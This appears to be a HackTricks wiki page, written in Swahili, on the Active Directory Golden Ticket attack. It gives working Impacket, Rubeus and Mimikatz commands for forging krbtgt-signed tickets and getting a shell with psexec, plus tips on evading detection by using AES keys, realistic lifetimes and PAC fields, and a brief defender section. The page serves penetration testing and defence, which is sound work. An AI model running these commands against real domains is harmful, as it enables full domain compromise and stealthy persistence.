# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Shambulio la **Golden Ticket** linahusisha **uundaji wa Ticket Granting Ticket (TGT) halali unaomwakilisha mtumiaji yeyote** kwa kutumia **NTLM hash ya akaunti ya Active Directory (AD) krbtgt**. Mbinu hii ina faida kubwa kwa sababu **huwezesha access kwa service au machine yoyote** ndani ya domain kama mtumiaji anayewakilishwa. Ni muhimu kukumbuka kuwa **credentials za akaunti ya krbtgt hazisasishwi kiotomatiki kamwe**.<sup>[[1]](#references)</sup>

Ili **kupata NTLM hash** ya akaunti ya krbtgt, mbinu mbalimbali zinaweza kutumika. Inaweza kutolewa kutoka kwenye **Local Security Authority Subsystem Service (LSASS) process** au **NT Directory Services (NTDS.dit) file** iliyoko kwenye Domain Controller (DC) yoyote ndani ya domain. Zaidi ya hayo, **kutekeleza DCsync attack** ni mkakati mwingine wa kupata NTLM hash hii, ambao unaweza kufanywa kwa kutumia tools kama **lsadump::dcsync module** katika Mimikatz au **secretsdump.py script** ya Impacket. Ni muhimu kusisitiza kwamba ili kutekeleza operesheni hizi, kwa kawaida **domain admin privileges au access ya kiwango kama hicho huhitajika**.<sup>[[2]](#references)</sup>

Ingawa NTLM hash ni njia inayoweza kutumika kwa madhumuni haya, **inapendekezwa sana** **kuforge tickets kwa kutumia Advanced Encryption Standard (AES) Kerberos keys (AES128 na AES256)** kwa sababu za usalama wa uendeshaji. Hili ni muhimu zaidi katika domain za kisasa kwa sababu **matumizi ya RC4 yanaondolewa hatua kwa hatua** na hujitokeza wazi zaidi katika Kerberos telemetry.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Vidokezo vya kisasa vya kutengeneza ticket

Inapowezekana, **query LDAP na SYSVOL kwanza** kisha forge ticket kwa kutumia domain policy halisi na thamani za user PAC badala ya kuzibuni mwenyewe:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` huomba DC taarifa za user, group, NetBIOS na policy zinazotumika kuunda PAC halisi zaidi.
- `/printcmd` huchapisha command line ya offline yenye PAC fields zilizopatikana, jambo linalofaa ikiwa baadaye utataka ku-forge ticket hiyo hiyo bila kugusa LDAP tena.
- `/extendedupndns` huongeza vipengele vipya vya `UpnDns` vya PAC vyenye `samAccountName` na account SID.
- `/oldpac` huondoa PAC buffers mpya za `Requestor` na `Attributes`; hii hufaa zaidi kwa compatibility testing dhidi ya environments za zamani, si kwa tradecraft ya kawaida.

Kutoka Linux, versions za hivi karibuni za Impacket pia zinaunga mkono kuongeza PAC structures mpya na kuweka validity period halisi:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` iko katika **masaa**. Chaguo-msingi ni **miaka 10**, ambayo husababisha kelele nyingi.
- `-extra-pac` huongeza taarifa mpya za `UPN_DNS` PAC.
- `-old-pac` hulazimisha mpangilio wa zamani wa PAC.
- `-extra-sid` ni muhimu wakati PAC inahitaji SIDs za ziada (kwa mfano, katika hali za escalation kutoka child hadi parent, ambazo zimeelezwa katika [SID-History Injection](sid-history-injection.md)).

**Mara** tu unapokuwa umeingiza **golden Ticket**, unaweza kufikia **faili zilizoshirikiwa (C$)**, na kutekeleza services na WMI, hivyo unaweza kutumia **psexec** au **wmiexec** kupata shell (inaonekana huwezi kupata shell kupitia winrm).

### Kukwepa detections za kawaida

Njia zinazotumika mara nyingi kutambua golden ticket ni **kukagua trafiki ya Kerberos** kwenye wire. Kwa chaguo-msingi, Mimikatz **husaini TGT kwa miaka 10**, jambo litakaloonekana kuwa lisilo la kawaida katika maombi ya TGS yanayofuata yanayotumia TGT hiyo.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Tumia vigezo vya `/startoffset`, `/endin` na `/renewmax` kudhibiti start offset, muda na renewals za juu zaidi (vyote vikiwa katika dakika).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Kwa bahati mbaya, muda wa uhai wa TGT hauandikwi kwenye rekodi za 4769, hivyo hutapata taarifa hii katika Windows event logs. Hata hivyo, unachoweza kuhusianisha ni **kuona rekodi za 4769 bila kuwepo kwa rekodi ya awali ya 4768**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kukadiria kuwa ilighushiwa offline.

Katika **Windows builds mpya zaidi**, Event IDs **4768** na **4769** pia zinaonyesha taarifa bora zaidi za **aina ya encryption**. TGT/TGS iliyoghushiwa inayotumia **RC4 (`0x17`)** katika domain ambayo `krbtgt`, clients na services tayari zina AES keys, ni rahisi zaidi kugundua kuliko ilivyokuwa miaka michache iliyopita. Hii ni sababu nyingine ya kupendelea **AES-backed Golden Tickets** na kuendana kwa karibu iwezekanavyo na sera ya kawaida ya Kerberos ya domain.

Suala jingine la OPSEC ni **PAC fidelity**. Tickets zenye group memberships zisizowezekana, PAC buffers mpya zinazokosekana, au account metadata isiyolingana na LDAP, ni rahisi zaidi kugundua wakati defenders wanathibitisha maudhui ya PAC dhidi ya data ya AD. Ikiwa unahitaji TGT inayoonekana kana kwamba ilitolewa kweli na DC, pitia:

{{#ref}}
diamond-ticket.md
{{#endref}}

Pia kuna **mipaka ya kimazingira** ya persistence. Account ya `krbtgt` huhifadhi **password history ya 2**, hivyo TGT iliyoghushiwa inaweza kubaki valid baada ya **reset ya kwanza ya `krbtgt`** ikiwa ilisainiwa kwa key ya awali. Hii ndiyo sababu defenders hubatilisha Golden Tickets kwa **kureset `krbtgt` mara mbili** na kusubiri angalau muda wa juu zaidi wa uhai wa ticket wa domain kati ya resets.<sup>[[3]](#references)</sup>

Ili **kupita detection** hii, angalia diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Mbinu nyingine ndogo ambazo defenders wanaweza kutumia ni **kuweka alert kwa rekodi za 4769 za users nyeti** kama vile default domain administrator account, na kuweka alert kwa **matumizi ya RC4 kwa `krbtgt`** katika domains ambazo kwa kawaida hutoa AES tickets.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
